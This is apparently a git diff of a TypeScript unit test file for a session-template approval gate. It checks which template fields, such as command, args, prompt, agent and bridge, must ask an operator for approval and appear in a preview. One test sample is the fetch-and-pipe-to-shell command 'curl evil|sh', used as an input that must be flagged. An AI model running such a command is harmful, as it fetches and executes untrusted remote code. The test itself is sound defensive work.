@@ -3,6 +3,7 @@ import { test, expect } from "bun:test";
 // Pure module (no electron / node), imports cleanly under bun.
 import {
   templateApproval,
+  TEMPLATE_SESSION_FIELD_CLASS,
   toTemplate,
   templateToInputs,
   templateHasShellFields,
@@ -236,15 +237,14 @@ test("a template written before role existed still parses and applies identicall
 
 // ----- templateHasShellFields (B4 gating trigger) -----
 
-test("templateHasShellFields flags command or non-empty args, ignores agent/model", () => {
+test("templateHasShellFields flags command or non-empty args, ignores model", () => {
   const mk = (sessions: SessionTemplate["sessions"]): SessionTemplate => ({
     type: TEMPLATE_TYPE,
     version: 1,
     sessions,
   });
   expect(templateHasShellFields(mk([{ name: "a" }]))).toBe(false);
-  // agent/model alone are NOT shell-bearing (allow-listed + quoted at spawn).
-  expect(templateHasShellFields(mk([{ name: "a", agent: "dev", model: "opus[1m]" }]))).toBe(false);
+  expect(templateHasShellFields(mk([{ name: "a", model: "opus[1m]" }]))).toBe(false);
   expect(templateHasShellFields(mk([{ name: "a", args: "   " }]))).toBe(false);
   expect(templateHasShellFields(mk([{ name: "a", command: "curl evil|sh" }]))).toBe(true);
   expect(templateHasShellFields(mk([{ name: "a", args: "--dangerously-skip" }]))).toBe(true);
@@ -270,6 +270,44 @@ test("templateHasShellFields flags a bridge marker, whatever it names, and ignor
   expect(templateHasShellFields(mk({ name: "a", bridge: "clodex-evil" }))).toBe(true);
   expect(templateHasShellFields(mk({ name: "a", bridge: 42 }))).toBe(true);
   expect(templateHasShellFields(mk({ name: "a", bridge: { toString: () => "" } }))).toBe(true);
+});
+
+const alone = (session: SessionTemplate["sessions"][number]): SessionTemplate => ({
+  type: TEMPLATE_TYPE,
+  version: 1,
+  sessions: [session],
+});
+
+test("a session carrying only lead, agent or prompt gates the template, and the preview shows the value", () => {
+  const cases = [
+    { session: { name: "dev", lead: true }, shown: "lead" },
+    { session: { name: "dev", agent: "team-lead" }, shown: "team-lead" },
+    { session: { name: "dev", prompt: "do the thing" }, shown: "do the thing" },
+  ];
+  for (const { session, shown } of cases) {
+    const tpl = alone(session);
+    expect(templateHasShellFields(tpl), `${JSON.stringify(session)} has to ask the operator`).toBe(true);
+    expect(templateApproval(tpl).previewLines.join("\n"), `${JSON.stringify(session)} has to be shown`).toContain(shown);
+  }
+});
+
+test("the hash of a template changes when lead, agent or prompt is added", () => {
+  const hash = (session: SessionTemplate["sessions"][number]) => JSON.stringify(templateApproval(alone(session)).hashPayload);
+  const base = hash({ name: "dev", args: "--x" });
+  for (const extra of [{ lead: true }, { agent: "team-lead" }, { prompt: "p" }]) {
+    expect(hash({ name: "dev", args: "--x", ...extra }), `${JSON.stringify(extra)} has to change the approved payload`).not.toBe(base);
+  }
+});
+
+test("name, color, role, model and effort alone open no dialog and show nothing", () => {
+  const tpl = alone({ name: "dev", color: "#4f86ff", role: "reviewer", model: "opus", effort: "high" });
+  expect(templateHasShellFields(tpl)).toBe(false);
+  expect(templateApproval(tpl).previewLines).toEqual([]);
+});
+
+test("an empty value of an approval field does not gate", () => {
+  const tpl = alone({ name: "dev", lead: false, prompt: "  ", agent: "", worktreeBranch: "", announce: " ", disallowedTools: [] });
+  expect(templateHasShellFields(tpl)).toBe(false);
 });
 
 test("a clodex bridge survives tile template parse and input round-trip", () => {
@@ -343,7 +381,55 @@ test("parseTemplate rejects the whole file for every invalid clodexContextTokens
   }
 });
 
-test("the context size is not a shell-bearing field", () => {
+test("a context size asks for approval even without a bridge", () => {
   const tpl = parseTemplate({ type: TEMPLATE_TYPE, version: 1, sessions: [{ name: "a", clodexContextTokens: 300_000 }] })!.template;
-  expect(templateHasShellFields(tpl)).toBe(false);
+  expect(templateHasShellFields(tpl)).toBe(true);
 });
+
+// ----- the classification table -----
+
+const classed = (wanted: string) =>
+  Object.entries(TEMPLATE_SESSION_FIELD_CLASS)
+    .filter(([, cls]) => cls === wanted)
+    .map(([field]) => field);
+
+const APPROVAL_SAMPLES: Record<string, unknown> = {
+  command: "run-cmd",
+  args: "--flag-x",
+  bridge: "clodex",
+  clodexContextTokens: 300_000,
+  prompt: "prompt-x",
+  lead: true,
+  agent: "agent-x",
+  worktreeBranch: "branch-x",
+  announce: "announce-x",
+  disallowedTools: ["Bash"],
+};
+
+test("the fields free of approval are exactly name, color, role, model and effort", () => {
+  expect(classed("free").sort(), "the free set is the operator's decision: every other field asks for approval").toEqual([
+    "color",
+    "effort",
+    "model",
+    "name",
+    "role",
+  ]);
+});
+
+test("every approval field has a sample in this file, so the loop below covers it", () => {
+  expect(Object.keys(APPROVAL_SAMPLES).sort()).toEqual(classed("approval").sort());
+});
+
+for (const field of Object.keys(APPROVAL_SAMPLES)) {
+  test(`${field} alone gates the template, changes the approved payload and is shown to the operator`, () => {
+    const value = APPROVAL_SAMPLES[field];
+    const withField = alone({ name: "dev", [field]: value } as SessionTemplate["sessions"][number]);
+    const without = alone({ name: "dev" });
+    expect(templateHasShellFields(withField), `${field} has to ask the operator`).toBe(true);
+    expect(JSON.stringify(templateApproval(withField).hashPayload), `${field} has to be in the approved payload`).not.toBe(
+      JSON.stringify(templateApproval(without).hashPayload),
+    );
+    const shown = value === true ? field : Array.isArray(value) ? value.join(",") : String(value);
+    expect(templateApproval(withField).previewLines.join("\n"), `${field} has to be shown`).toContain(shown);
+  });
+}
